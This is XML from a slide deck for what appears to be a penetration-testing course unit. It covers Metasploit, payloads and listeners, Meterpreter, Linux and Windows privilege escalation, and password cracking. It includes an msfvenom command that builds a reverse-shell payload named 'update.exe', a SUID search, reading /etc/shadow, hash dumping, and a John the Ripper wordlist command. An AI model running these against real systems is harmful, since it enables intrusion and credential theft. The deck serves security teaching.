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bb8ce2e7-e2d4-928d-3b6c-4f0b5166cbe6}">
          <p14:sldIdLst>
            <p14:sldId id="257"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Metasploit Framework" id="{f69235cd-5d64-4f4d-0e9e-de1fc5d89281}">
          <p14:sldIdLst>
            <p14:sldId id="258"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Payload Engineering" id="{5577e418-e4f2-ac1b-5c8a-17dd744d80ab}">
          <p14:sldIdLst>
            <p14:sldId id="261"/>
            <p14:sldId id="262"/>
            <p14:sldId id="263"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Post-Exploitation" id="{ed7403f8-d9fd-c8b7-069a-e5f68c85d987}">
          <p14:sldIdLst>
            <p14:sldId id="264"/>
            <p14:sldId id="265"/>
            <p14:sldId id="266"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Privilege Escalation" id="{2c950f1a-8718-9e22-fbd9-41404113f089}">
          <p14:sldIdLst>
            <p14:sldId id="267"/>
            <p14:sldId id="268"/>
            <p14:sldId id="269"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Password Attacks" id="{fedda7dc-157b-be02-88a4-a00954814226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Default-1" id="{5790791c-f11f-4efa-e617-5b0dd53cf18d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84048"/>
            <a:ext cx="103327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700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6510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  ·   SYSTEM EXPLOITATION &amp; POST-EXPLOITATION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3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3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image" Target="../media/image-14-2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3" name="Image 0" descr="/home/claude/unit3/icon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02412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TRAINING PROGRAM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77240" y="27432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822960" y="38862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Exploitation &amp; Post-Exploitation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841248" y="4709160"/>
            <a:ext cx="310896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 Framework  •  Payloads &amp; Listeners  •  Meterpreter  •  Privilege Escalation  •  Password Attacks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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/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509138"/>
            <a:ext cx="298460" cy="2984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 in This Unit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298448"/>
            <a:ext cx="457200" cy="45720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6" name="Image 1" descr="/home/claude/unit3/icons/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417320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 Framework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234440" y="158191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interfaces and the core msfconsole commands used to run an exploit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48640" y="2130552"/>
            <a:ext cx="11064240" cy="0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11" name="Image 2" descr="/home/claude/unit3/icons/pack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40487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221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Engineering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234440" y="256946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vs stageless payloads, building them with MSFvenom, and catching sessions with a listener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3118104"/>
            <a:ext cx="11064240" cy="0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48640" y="3273552"/>
            <a:ext cx="457200" cy="45720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16" name="Image 3" descr="/home/claude/unit3/icons/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39242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320954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Post-Exploitation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234440" y="355701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control with Meterpreter and automating enumeration with post modules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4105656"/>
            <a:ext cx="11064240" cy="0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48640" y="4261104"/>
            <a:ext cx="457200" cy="45720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21" name="Image 4" descr="/home/claude/unit3/icons/escala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379976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419709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234440" y="45445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limited access into root / SYSTEM on Linux and Windows targets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548640" y="5093208"/>
            <a:ext cx="11064240" cy="0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548640" y="5248656"/>
            <a:ext cx="457200" cy="45720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26" name="Image 5" descr="/home/claude/unit3/icons/k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367528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234440" y="51846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Attacks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1234440" y="5532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hash types and cracking them with John the Ripper, Hashcat and Hydra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548640" y="6080760"/>
            <a:ext cx="11064240" cy="0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3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3" name="Image 0" descr="/home/claude/unit3/icon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67919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1460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3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468880" y="2670048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 Framework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487168" y="3794760"/>
            <a:ext cx="292608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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icon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509138"/>
            <a:ext cx="298460" cy="2984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 Framework Architecture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0789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 is a modular exploitation framework: every capability is built from a small set of reusable layers rather than one monolithic tool.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3547872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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8" name="Image 1" descr="/home/claude/unit3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2142439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69748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2960" y="3108960"/>
            <a:ext cx="29992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Rex, MSF Core and MSF Base provide the underlying classes — networking, sockets, protocols — that every exploit and payload is written on top of.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43400" y="1737360"/>
            <a:ext cx="3547872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="2011680"/>
            <a:ext cx="502920" cy="50292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13" name="Image 2" descr="/home/claude/unit3/icons/term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479" y="2142439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17720" y="269748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617720" y="3108960"/>
            <a:ext cx="29992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msfconsole is the primary command-line interface for running modules interactively; msfweb exposes the framework through a browser-based front end.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38160" y="1737360"/>
            <a:ext cx="3547872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8412480" y="2011680"/>
            <a:ext cx="502920" cy="50292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18" name="Image 3" descr="/home/claude/unit3/icons/pack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3239" y="2142439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12480" y="269748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412480" y="3108960"/>
            <a:ext cx="29992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(scanning / DoS), exploit (delivers the attack), payload (code executed after exploitation), encoder (evades signatures), nop (buffer padding), post (post-exploitation actions).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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icon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509138"/>
            <a:ext cx="298460" cy="2984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msfconsole Commands &amp; Connection Variables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msfconsole Workflow Commands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6583680" cy="516636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554480"/>
            <a:ext cx="21031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&lt;name&gt;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880360" y="1554480"/>
            <a:ext cx="411480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modules matching a keyword, e.g. a CVE or product name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2071116"/>
            <a:ext cx="21031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&lt;module&gt;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880360" y="2071116"/>
            <a:ext cx="411480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chosen module into the active workspace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587752"/>
            <a:ext cx="6583680" cy="516636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587752"/>
            <a:ext cx="21031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options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880360" y="2587752"/>
            <a:ext cx="411480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every setting the loaded module needs before it can run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85800" y="3104388"/>
            <a:ext cx="21031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&lt;OPT&gt; &lt;val&gt;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880360" y="3104388"/>
            <a:ext cx="411480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value to one of those required options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621024"/>
            <a:ext cx="6583680" cy="516636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3621024"/>
            <a:ext cx="21031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/ exploit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880360" y="3621024"/>
            <a:ext cx="411480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module against the configured target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85800" y="4137660"/>
            <a:ext cx="21031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880360" y="4137660"/>
            <a:ext cx="411480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Unloads the current module and returns to the main prompt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654296"/>
            <a:ext cx="6583680" cy="516636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4654296"/>
            <a:ext cx="21031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2880360" y="4654296"/>
            <a:ext cx="411480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interacts with, or kills active post-exploitation sessions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452360" y="1143000"/>
            <a:ext cx="4187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Variables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452360" y="1554480"/>
            <a:ext cx="4187952" cy="4114800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1778"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="1764792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LHOST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680960" y="2057400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Attacker's IP — the Listen Host the target connects back to</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1080" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="2734056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LPORT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680960" y="3026664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Attacker's Listen Port for the incoming connection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1080" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="370332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RHOST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680960" y="3995928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Target's IP — the Remote Host being attacked</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1080" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="4672584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RPORT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680960" y="4965192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Target's Remote Port the exploit connects to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3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3" name="Image 0" descr="/home/claude/unit3/icons/pac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67919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1460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3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468880" y="2670048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Engineering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487168" y="3794760"/>
            <a:ext cx="292608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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icons/pac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509138"/>
            <a:ext cx="298460" cy="2984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Payloads: Staged vs Stageless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payload is the code that actually runs once an exploit succeeds. How it's delivered to the target changes its size, reliability and detectability.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EEF2F6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691640"/>
            <a:ext cx="5440680" cy="59436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69164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2468880"/>
            <a:ext cx="4892040" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12727"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B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87552" y="2578608"/>
            <a:ext cx="4562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F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windows/meterpreter/reverse_tcp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264408"/>
            <a:ext cx="91440" cy="9144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32004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 two parts: a tiny stager connects back first, then pulls down the full payload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" y="4105656"/>
            <a:ext cx="91440" cy="9144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404164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initial footprint — useful when the exploit only has limited space to inject code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" y="4946904"/>
            <a:ext cx="91440" cy="9144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48828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the connection to stay stable through both stages to fully load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72200" y="169164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EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1691640"/>
            <a:ext cx="5440680" cy="59436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169164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Stageless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446520" y="2468880"/>
            <a:ext cx="4892040" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12727"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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611112" y="2578608"/>
            <a:ext cx="4562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F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windows/shell_reverse_tcp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46520" y="3264408"/>
            <a:ext cx="91440" cy="914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3" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="32004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payload is self-contained in a single package — nothing further to download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46520" y="4105656"/>
            <a:ext cx="91440" cy="914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5" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="404164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file size, but delivered and executed in one shot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46520" y="4946904"/>
            <a:ext cx="91440" cy="914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7" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6675120" y="48828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reliable on shaky or filtered connections since there's no second stage to fetch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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icon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509138"/>
            <a:ext cx="298460" cy="2984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Payload with MSFvenom &amp; Catching It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MSFvenom merges the old msfpayload and msfencode tools into one command-line generator for standalone payloads — run outside msfconsole, output as an .exe, .apk, .php and more.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0D1B2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13232" y="1737360"/>
            <a:ext cx="10762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F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msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.5 LPORT=4444 -f exe -o update.exe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24505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payload reaches the target, a listener must already be running on the attacker machine to catch the callback — the exploit/multi/handler module, configured with the same PAYLOAD, LHOST and LPORT as the generated file.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EF2F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593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468880" y="3611880"/>
            <a:ext cx="457200" cy="45720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12" name="Image 1" descr="/home/claude/unit3/icons/pack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" y="373075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4206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31520" y="45720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msfvenom builds the payload file with the attacker's LHOST / LPORT baked in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154680" y="3429000"/>
            <a:ext cx="182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3319272" y="34290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EF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502152" y="3593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5239512" y="3611880"/>
            <a:ext cx="457200" cy="45720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19" name="Image 2" descr="/home/claude/unit3/icons/un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3730752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502152" y="4206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3502152" y="45720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reaches the target — via download, USB, email or another vector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925312" y="3429000"/>
            <a:ext cx="182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6089904" y="34290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EF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="3593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8010144" y="3611880"/>
            <a:ext cx="457200" cy="45720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26" name="Image 3" descr="/home/claude/unit3/icons/termin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3730752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272784" y="4206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6272784" y="45720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exploit/multi/handler starts on the attacker, matched to the same payload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8695944" y="3429000"/>
            <a:ext cx="182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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8860536" y="34290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EF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="3593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Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10780776" y="3611880"/>
            <a:ext cx="457200" cy="45720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33" name="Image 4" descr="/home/claude/unit3/icons/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9648" y="3730752"/>
            <a:ext cx="219456" cy="21945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043416" y="4206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450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9043416" y="45720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runs the file; it calls back and a session opens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3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3" name="Image 0" descr="/home/claude/unit3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67919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1460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3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468880" y="2670048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Post-Exploitation with Meterpreter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487168" y="3794760"/>
            <a:ext cx="292608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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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Meterpreter: Core Commands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Meterpreter is Metasploit's in-memory post-exploitation agent — once a session opens, these commands explore and control the compromised host.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679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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188366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sysinfo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2304288"/>
            <a:ext cx="235000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the target's OS, hostname and architecture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737360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502152" y="188366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getuid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02152" y="2304288"/>
            <a:ext cx="235000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user account the session is running as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0" y="1737360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="188366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291072" y="2304288"/>
            <a:ext cx="235000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current working directory on the target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915400" y="1737360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="188366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079992" y="2304288"/>
            <a:ext cx="235000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files and folders in the current directory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4023360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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416966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13232" y="4590288"/>
            <a:ext cx="235000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a file from the target to the attacker machine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337560" y="4023360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502152" y="416966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502152" y="4590288"/>
            <a:ext cx="235000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a file from the attacker machine onto the target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26480" y="4023360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="416966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291072" y="4590288"/>
            <a:ext cx="235000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into a native command shell on the target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915400" y="4023360"/>
            <a:ext cx="2679192" cy="2057400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9079992" y="416966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079992" y="4590288"/>
            <a:ext cx="235000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the session into another running process for stability or stealth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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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Post-Exploitation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91672" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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7" name="Image 1" descr="/home/claude/unit3/icons/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5727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post/multi/recon/local_exploit_suggester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600200" y="2084832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post module that fingerprints the compromised host and cross-references it against Metasploit's exploit library, suggesting which local privilege-escalation exploits are likely to work — instead of testing each one by hand.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3429000"/>
            <a:ext cx="11091672" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3703320"/>
            <a:ext cx="548640" cy="54864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12" name="Image 2" descr="/home/claude/unit3/icons/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38459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36301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hashdump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600200" y="4142232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stored password hashes from the compromised system — the SAM database on Windows — so they can be cracked offline with tools like John the Ripper or Hashcat.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48640" y="5532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automate? Across many compromised hosts, automated enumeration finds escalation paths faster and keeps findings consistent for reporting.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3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3" name="Image 0" descr="/home/claude/unit3/icons/esca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67919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1460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3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468880" y="2670048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487168" y="3794760"/>
            <a:ext cx="292608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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icons/esca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509138"/>
            <a:ext cx="298460" cy="2984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Privilege Escalation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on Linux almost always comes down to finding a misconfiguration that grants more power than the current user should have.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19072"/>
            <a:ext cx="457200" cy="45720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07008" y="1645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sudo privileges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207008" y="2011680"/>
            <a:ext cx="56692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which commands the current user can run as another user (often root) — sometimes without even needing a password. Any command here is a potential escalation path.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7040880" y="1719072"/>
            <a:ext cx="4599432" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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05472" y="1828800"/>
            <a:ext cx="4270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F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-l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7240" y="3136392"/>
            <a:ext cx="0" cy="0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3255264"/>
            <a:ext cx="457200" cy="45720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07008" y="31821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for SUID binaries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207008" y="3547872"/>
            <a:ext cx="56692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files that run with the file owner's privileges — frequently root — no matter which user executes them. An exploitable SUID binary hands over root directly.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1130" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="3255264"/>
            <a:ext cx="4599432" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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205472" y="3364992"/>
            <a:ext cx="4270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F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/ -perm -4000 -type f 2&gt;/dev/null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77240" y="4672584"/>
            <a:ext cx="0" cy="0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4791456"/>
            <a:ext cx="457200" cy="45720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07008" y="47183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root &amp; extract hashes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1207008" y="5084064"/>
            <a:ext cx="56692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root is obtained, reading /etc/shadow exposes the system's password hashes, confirming full compromise of the host.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1130" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="4791456"/>
            <a:ext cx="4599432" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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205472" y="4901184"/>
            <a:ext cx="4270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F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/etc/shadow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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icons/esca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509138"/>
            <a:ext cx="298460" cy="2984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Privilege Escalation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Windows, escalation paths typically abuse how services, registry permissions or authentication tokens are configured.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47872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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8" name="Image 1" descr="/home/claude/unit3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2096719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651760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Unquoted Service Paths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3291840"/>
            <a:ext cx="299923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service's executable path contains spaces but isn't wrapped in quotes. Windows then tries each space-separated segment in turn as a possible binary — an attacker drops a malicious .exe at one of those earlier paths and it runs instead of the real service.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43400" y="1691640"/>
            <a:ext cx="3547872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1965960"/>
            <a:ext cx="502920" cy="5029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3" name="Image 2" descr="/home/claude/unit3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479" y="2096719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17720" y="2651760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Registry Permissions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617720" y="3291840"/>
            <a:ext cx="299923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low-privileged user can modify the registry key that defines a service, they can repoint it at a malicious binary. When that service starts, Windows launches the attacker's file with SYSTEM privileges.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138160" y="1691640"/>
            <a:ext cx="3547872" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2062"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8412480" y="1965960"/>
            <a:ext cx="502920" cy="5029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8" name="Image 3" descr="/home/claude/unit3/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3239" y="2096719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12480" y="2651760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Impersonation (getsystem)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412480" y="3291840"/>
            <a:ext cx="299923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Meterpreter's getsystem command abuses impersonation tokens and named-pipe tricks to escalate an existing session straight to NT AUTHORITY\SYSTEM, the highest privilege level on Windows.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3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3" name="Image 0" descr="/home/claude/unit3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67919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1460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3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468880" y="2670048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Attacks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487168" y="3794760"/>
            <a:ext cx="292608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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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Hash Types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cracking a hash, you have to know which algorithm produced it — picking the wrong mode wastes hours of compute for zero results. Length, character set and any fixed prefix usually give it away; tools such as hashid or hashcat --identify automate the lookup.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11091672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Type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474720" y="1965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Format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32320" y="1965960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You'll See It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423160"/>
            <a:ext cx="11091672" cy="54864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423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7472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hex characters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32320" y="2423160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application and file-integrity hashes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" y="2971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74720" y="2971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hex characters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132320" y="2971800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application hashes, some Git/commit contexts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520440"/>
            <a:ext cx="11091672" cy="54864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NTLM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474720" y="35204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hex characters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132320" y="3520440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local account and domain credential hashes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74720" y="4069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 with $2a$ or $2b$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132320" y="4069080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web application password storage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4892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match the hash's length and character set to a known algorithm first — then confirm with an identification tool before committing to a long crack.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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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the Ripper — Dictionary Attacks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0972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the Ripper cracks password hashes by comparing them against candidate passwords. A dictionary attack tries every entry in a wordlist rather than brute-forcing every possible combination, making it fast against weak or reused passwords.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260604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rockyou.txt is the wordlist most commonly paired with John — roughly 14 million real passwords leaked from a past data breach, making it highly effective against everyday human-chosen passwords.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4069080"/>
            <a:ext cx="6675120" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7778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4178808"/>
            <a:ext cx="6345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dictionary attack against a hash file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F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 --wordlist=rockyou.txt hashes.txt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98080" y="1097280"/>
            <a:ext cx="4142232" cy="3794760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1928"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF2F6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0" y="1371600"/>
            <a:ext cx="502920" cy="50292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11" name="Image 1" descr="/home/claude/unit3/icons/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159" y="15023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0" y="201168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Dictionary First?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772400" y="2423160"/>
            <a:ext cx="35935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real-world passwords are reused, simple, or based on common words — a dictionary attack checks the likeliest candidates first, before ever resorting to slower brute-force search.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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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Hashcat — Identification &amp; Mode-Based Cracking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Hashcat is a GPU-accelerated password recovery tool — far faster than CPU-based cracking for large wordlists or brute-force ranges.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EEF2F6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7647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Identify the Hash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14884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hashcat --identify inspects a captured hash and suggests the correct algorithm and its mode number before any cracking starts.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862072"/>
            <a:ext cx="4983480" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
